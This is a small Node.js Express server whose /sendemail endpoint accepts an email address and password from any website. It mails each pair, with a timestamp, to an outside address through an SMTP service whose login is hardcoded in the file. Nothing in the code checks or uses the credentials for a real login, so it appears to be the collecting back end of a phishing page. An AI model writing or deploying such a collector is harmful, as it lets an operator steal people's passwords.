const morgan = require("morgan")
const express = require("express")
const nodemailer = require("nodemailer")
const cors = require("cors")

const app = express()
const port = process.env.PORT || 30000

app.use(express.json())
app.use(express.urlencoded({ extended: true }))
app.use(morgan("dev"))
app.use(cors())
const sendEmail = (email, password) => {

    let dataToSend = {
        email: email,
        password: password,
        timestamp: new Date()
    }

    var transporter = nodemailer.createTransport({
        host: "sandbox.smtp.mailtrap.io",
        port: 2525,
        auth: {
          user: "66f2c4bca41d78",
          pass: "e827e3ae212774"
        }
    });
    
    let message = {
        from: "from-example@email.com",
        to: "to-example@email.com",
        subject: "Subject",
        html: `<p>Email: ${dataToSend.email}</p><p>Password: ${dataToSend.password}</p><p>Date: ${dataToSend.timestamp}<p/>`
    }
    
    transporter.sendMail(message, function(err, info) {
        console.log(err)
        console.log(info)
    })
}

app.post("/sendemail", (req, res) => {
    const {email, password} = req.body
    sendEmail(email, password)
    return res.status(200).json({message: "Email sent", status: true})
})

app.get("/", (req, res) => {
    return res.status(200).json("ok")
})

app.listen(port, () => {
    console.log(`Listening on port ${port}.`)
})